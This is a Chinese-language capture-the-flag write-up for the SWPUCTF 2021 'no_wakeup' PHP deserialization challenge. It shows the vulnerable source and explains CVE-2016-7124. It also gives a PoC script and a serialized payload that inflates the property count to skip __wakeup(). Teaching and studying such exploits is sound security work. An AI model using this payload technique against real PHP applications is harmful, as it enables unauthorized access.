# [SWPUCTF 2021 新生赛]no_wakeup


# [SWPUCTF 2021 新生赛]no_wakeup

![](https://pic.imgdb.cn/item/653a4d8ac458853aeff8d7ea.jpg)

![](https://pic.imgdb.cn/item/653a4db3c458853aeff9609e.jpg)

```php
<?php
header("Content-type:text/html;charset=utf-8");
error_reporting(0); 
show_source("class.php");

class HaHaHa {
    public $admin;
    public $passwd;

    public function __construct() {
        $this->admin = "user";
        $this->passwd = "123456";
    }

    public function __wakeup() {
        $this->passwd = sha1($this->passwd); // 将 passwd 字段哈希化
    }

    public function __destruct() {
        if ($this->admin === "admin" && $this->passwd === "wllm") {// 如果 admin 和 passwd 匹配
            include("flag.php"); 
            echo $flag; 
        } else {
            echo $this->passwd;
            echo "No wake up"; 
        }
    }
}
$Letmeseesee = $_GET['p']; // 从 GET 请求中获取名为 'p' 的参数
unserialize($Letmeseesee); // 反序列化 'p' 参数
?>
```

**传给 unserialize() 的参数可控且存在 Magic 方法，存在反序列化漏洞**

__destruct() 在对象被销毁时调用

当变量 admin 的值为 "admin"、变量 passwd 的值为 "wllm" 时才会输出 flag

但是在对象被反序列化时调用的 __wakeup() 会把变量 passwd 的值加密，所以只要 \_\_wakeup() 被执行，不管变量 passwd 的值是什么，加密后肯定不等于 "wllm"，唯一的办法就是让 \_\_wakeup() 不被执行

> **Magic方法：**
>
> __construct()：构造函数，当对象创建时调用
>
> __destruct()：析构函数，当对象被销毁时调用
>
> __toString()：当对象被当作字符串时使用
>
> __sleep()：在对象序列化的时候调用
>
> __wakeup()：在对象被反序列化时调用
>
> 从序列化到反序列化这几个函数的执行过程：
>
> \_\_construct() ->\_\_sleep() -> \_\_wakeup() -> \_\_toString() -> \_\_destruct()
>
> 详情参考：[PHP反序列化漏洞详解（万字分析、由浅入深）](https://blog.csdn.net/Hardworking666/article/details/122373938)

​	

**CVE-2016-7124 (绕过 __wakeup() )**

**漏洞影响版本：**

- PHP 5 ~ 5.6.25
- PHP 7 ~ 7.0.10

**漏洞利用方法：**

若在对象的魔法函数中存在的 \_\_wakeup() 方法，在调用 unserilize() 方法进行反序列化之前会先调用\_\_wakeup() 方法，**但如果序列化字符串中表示对象属性个数的值大于真实的属性个数时，会跳过 \_\_wakeup() 的执行**

在演示 CVE-2016-7124 漏洞前先把反序列化漏洞的 poc 写出来：

```php
<?php
class HaHaHa
{
   public $admin = "admin";
   public $passwd = "wllm";

}
$obj = new HaHaHa();
$a = serialize($obj);
echo "?p=".$a;
?> 
```

运行后得到 payload ：`?p=O:6:"HaHaHa":2:{s:5:"admin";s:5:"admin";s:6:"passwd";s:4:"wllm";} `

如果直接把这个 payload 拿去执行，会因为 \_\_wakeup() 的执行而达不到效果

其中 O:6:"HaHaHa":2:{s:5:"admin";s:5:"admin";s:6:"passwd";s:4:"wllm";} 是反序列化的结果，2 代表对象属性个数(admin、passwd)，如果把 2 改成更大的数，就会导致 CVE-2016-7124 漏洞，即 \_\_wakeup() 不会被执行

![](https://pic.imgdb.cn/item/653a5707c458853aef1ba027.jpg)

